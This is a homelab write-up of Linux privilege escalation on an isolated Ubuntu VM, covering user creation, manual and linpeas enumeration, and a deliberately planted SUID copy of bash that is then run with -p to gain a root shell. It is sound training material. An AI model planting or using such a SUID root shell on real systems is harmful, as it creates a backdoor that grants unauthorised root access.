# HomeLab 4 — Linux Privilege Escalation

This lab demonstrates Linux privilege escalation techniques on an Ubuntu Server VM. I created a low-privileged user, performed manual and automated enumeration, confirmed that the system was fully patched with no exploitable misconfigurations, and introduced a controlled SUID vulnerability to demonstrate the privilege escalation process.

---

## Lab Environment

VM              | Role
--------------- | -----
Ubuntu Server   | Target

Network Mode: VirtualBox Host-Only  
User created for exploitation: labuser

---

## Objectives

- Create a low-privileged user
- Enumerate the system manually
- Enumerate the system using linpeas
- Identify the absence of privilege escalation vectors
- Add a controlled SUID misconfiguration
- Exploit the misconfiguration to gain root access

---

## Step 1 — Create Low-Privilege User

Commands used:
sudo adduser labuser  
sudo usermod -aG sudo labuser  
sudo deluser labuser sudo  
id labuser

This confirms labuser was created and removed from the sudo group.  
``Screenshot: Screenshots/lab4_user_creation.png``

---

## Step 2 — Manual Enumeration

System information:
whoami  
hostname  
uname -a  
cat /etc/os-release

The server is Ubuntu 24.04.3 LTS running kernel 6.8.0-87-generic.  
``Screenshot: Screenshots/lab4_system_info.png``

PATH enumeration:
echo $PATH  
``Screenshot: Screenshots/lab4_path_env.png``

SUID binaries:
find / -perm -4000 -type f 2>/dev/null  
``Screenshot: Screenshots/lab4_suid_list.png``

Cron jobs:
cat /etc/crontab  
ls -la /etc/cron.d/  
Screenshot: Screenshots/lab4_crontab.png

No privilege escalation vectors were found during manual enumeration.

---

## Step 3 — Automated Enumeration (linpeas)

Linpeas was downloaded using a local Python HTTP server and executed:
./linpeas.sh | tee linpeas.log

The initial linpeas scan did not identify any privilege escalation vectors.  
Download screenshot: Screenshots/lab4_linpeas_download.png  
Execution screenshot: Screenshots/lab4_linpeas_run.png

---

## Step 4 — Introduce Controlled SUID Vulnerability

A controlled misconfiguration was added for demonstration because the system had no exploitable paths.

Commands:
sudo cp /bin/bash /usr/local/bin/rootbash  
sudo chmod 4755 /usr/local/bin/rootbash  
ls -ls /usr/local/bin/rootbash

``Screenshot: Screenshots/lab4_suid_rootbash.png``

---

## Step 5 — linpeas Detection of SUID Binary

After adding the SUID binary, linpeas was executed again:
./linpeas.sh | tee linpeas_after_suid.log

Linpeas detected:
-rwsr-xr-x 1 root root 1.4M /usr/local/bin/rootbash (Unknown SUID binary!)

``Screenshot: Screenshots/lab4_after_suid.png``

---

## Step 6 — Exploitation

As labuser:
 /usr/local/bin/rootbash -p  
 whoami  
 id

This provided a root shell due to the SUID misconfiguration.  
``Screenshot: Screenshots/lab4_suid_ubuntu_root.png``

---

## Files Included in This Lab
```text
/lab4/  
├── README.md  
├── linpeas.log  
├── Linux Privilege Escalation.pdf
├── linpeas_after_suid.log  
└── Screenshots/  
    ├── lab4_user_creation.png  
    ├── lab4_sudo_l.png  
    ├── lab4_system_info.png  
    ├── lab4_path_env.png  
    ├── lab4_suid_list.png  
    ├── lab4_crontab.png  
    ├── lab4_linpeas_download.png  
    ├── lab4_linpeas_run.png  
    ├── lab4_suid_rootbash.png  
    ├── lab4_after_suid.png  
    └──lab4_suid_ubuntu_root.png
```
